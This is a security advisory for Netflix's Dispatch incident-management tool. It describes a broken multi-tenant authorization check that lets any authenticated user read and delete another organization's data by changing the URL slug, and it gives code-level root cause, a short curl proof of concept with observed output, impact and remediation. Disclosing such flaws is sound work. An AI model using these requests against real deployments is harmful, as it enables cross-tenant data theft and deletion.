https://github.com/Netflix/dispatch - "This repository was archived by the owner on Sep 3, 2025. It is now read-only."



## Finding: Cross-organization tenant isolation break: any authenticated user can read and modify another organization's data

Affected Versions: v20241220

(reported on 10 June 2026 via email - no response)

### Summary

Dispatch is multi-tenant: each organization is a separate Postgres schema and the API is namespaced under /api/v1/{organization}/. Organization membership is enforced per route by attaching OrganizationMemberPermission, but many routes omit it. On those routes nothing verifies that the authenticated caller belongs to the organization named in the URL, while the per-request database session is switched to that organization's schema. As a result, any authenticated user (a member of any single organization) can read, and in many cases create, modify, and delete, data belonging to other organizations by changing the organization slug in the path. This was confirmed end to end: a user who is a member of only organization "default" read and then deleted a tag in organization "victim", in which the user has no role.

### Details

The pieces that combine into the break:

- Global identity. DispatchUser and DispatchUserOrganization live in the global dispatch_core schema (src/dispatch/auth/models.py: `__table_args__ = {"schema": "dispatch_core"}`), and get_by_email (src/dispatch/auth/service.py) looks the user up globally. The JWT issued by the basic auth provider encodes only the user email, not an organization (src/dispatch/plugins/dispatch_core/plugin.py get_current_user: `data = jwt.decode(token, DISPATCH_JWT_SECRET); user_email = data["email"]`). One token therefore authenticates the user against every organization.

- No-op org guard. The organization router applies only `Depends(get_organization_path)`, and that dependency is empty (src/dispatch/api.py: `def get_organization_path(organization): pass`). get_current_user (src/dispatch/auth/service.py) returns the global user for the URL organization without checking membership.

- Schema switch without an authorization check. Middleware sets the request DB schema from the URL slug (src/dispatch/main.py: `schema = f"dispatch_organization_{organization_slug}"`). So a request to /{victim}/... queries the victim tenant's data.

- Membership is enforced only where a route opts in. OrganizationMemberPermission (src/dispatch/auth/permissions.py) does check `user.get_organization_role(organization)` and returns 403 when the user has no role, but only on routes that declare it. A sweep of src/dispatch/*/views.py shows many routers attach no PermissionsDependency at all (tags, terms, definitions, documents, entities, entity types, services, teams, data sources and queries, workflows, and others). Incident, case, and signal list routes are also reachable cross-organization (their only restriction is a row-level filter, restricted_incident_filter / restricted_case_filter in src/dispatch/database/service.py, which limits rows for non-admins but does not check organization membership).

Because the row-level filter map (apply_model_specific_filters) covers only Incident and Case, resources such as tags, documents, entities, services, and signals are returned in full to a non-member of the organization.

### PoC

Setup: two organizations, default and victim. The attacker account is a member of default only (role in victim is null). A tag exists in victim.

```
# attacker authenticates against their own org
ATK=$(curl -s -X POST "$API/default/auth/login" -d '{"email":"attacker@example.com","password":"..."}' | jq -r .token)

# the attacker has no role in victim
curl -s "$API/victim/auth/myrole" -H "Authorization: Bearer $ATK"        # -> null

# cross-org READ: list victim's tags
curl -s "$API/victim/tags" -H "Authorization: Bearer $ATK"
#   -> HTTP 200, items: [{"id":4,"name":"VICTIM-SECRET-TAG-do-not-leak","description":"confidential victim-tenant data"}]

# cross-org DELETE: destroy a victim tag
curl -s -o /dev/null -w '%{http_code}\n' -X DELETE "$API/victim/tags/4" -H "Authorization: Bearer $ATK"
#   -> 200  (the row is gone from dispatch_organization_victim.tag)

# contrast: a route that DOES use OrganizationMemberPermission is correctly blocked
curl -s -o /dev/null -w '%{http_code}\n' "$API/victim/users" -H "Authorization: Bearer $ATK"
#   -> 403
```

Observed live (dispatch on current main, basic auth, two organizations):

```
attacker role in victim: null
GET    /victim/tags        -> 200   items: [(4, 'VICTIM-SECRET-TAG-do-not-leak', 'confidential victim-tenant data')]
DELETE /victim/tags/4      -> 200   (victim tag table now empty)
GET    /victim/users       -> 403   (OrganizationMemberPermission)

breadth (attacker is a member of default only):
  /victim/tags 200  /victim/terms 200  /victim/definitions 200  /victim/documents 200
  /victim/entity 200  /victim/services 200  /victim/teams 200  /victim/data/sources 200
  /victim/incidents 200  /victim/cases 200  /victim/signals 200  /victim/plugins/instances 200
  /victim/users 403
```

scripts/poc_cross_org_isolation.sh reproduces this against a running instance.

### Impact

In any deployment with more than one organization, any authenticated user can cross the tenant boundary on every API route that does not attach OrganizationMemberPermission. This yields cross-tenant disclosure of another organization's tags, definitions, documents (incident document references), entities (data extracted from signals and incidents), services (on-call and escalation configuration), teams (contact details), data sources, workflows, and signal and incident listings, and cross-tenant integrity and availability loss through the create, update, and delete routes on those resources (demonstrated by deleting a victim organization's tag). The application clearly intends organization to be a security boundary, since it isolates tenants into separate schemas and enforces membership on routes that opt in (for example /users returns 403), so this is a broken enforcement of an existing boundary rather than an absent feature.

### Remediation

Enforce organization membership centrally rather than per route. Make get_organization_path (or a single router-level or middleware dependency) verify that the authenticated user has a role in the organization named in the path, and reject the request with 403 otherwise, so that authorization no longer depends on each individual route remembering to attach OrganizationMemberPermission. As defense in depth, scope queries to the caller's organization and audit every router under src/dispatch for a missing PermissionsDependency.
